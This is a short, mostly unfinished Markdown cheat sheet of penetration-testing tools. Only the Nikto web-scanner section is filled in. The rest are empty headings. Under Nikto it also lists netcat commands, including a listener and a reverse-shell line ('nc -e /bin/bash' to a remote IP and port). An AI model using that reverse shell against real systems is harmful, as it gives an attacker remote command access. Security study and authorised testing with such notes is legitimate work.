# Basic Tools - Description & How to Use

## Nikto
Nikto is a web scanner which test the web servers /URL of the target.
Nikto performs the comprehensive scan, checks the outdated version of servers.
It scans over 6700 vulnerable programs/directories.
Nikto checks the configuration of the server like multiple index files,
backup files lying on the server and other things.
#### Command Syntax

```
            nikto -host [IP]
            nikto -host [IP] --useproxy [PROXYIP]:[PORT]
            nc -lvp [port]
            nc -e /bin/bash [IP] [PORT]
            nc [IP] [PORT]
   ```
#### Example of Usage
```
            nikto -host 10.10.10.10								*
            nikto --host 10.10.10.10 --useproxy 10.10.10.10:1234
            nc -lvp 1234
            nc -e /bin/bash 10.10.10.10 1234
            nc 10.10.10.10 1234
   ```
## nmap

## wfuzz

## Hydra

## Burp

## Metasploit

## SQLmap

## Ettercap

## Wireshark

## gobuster - dirb

## librenms

## netbox
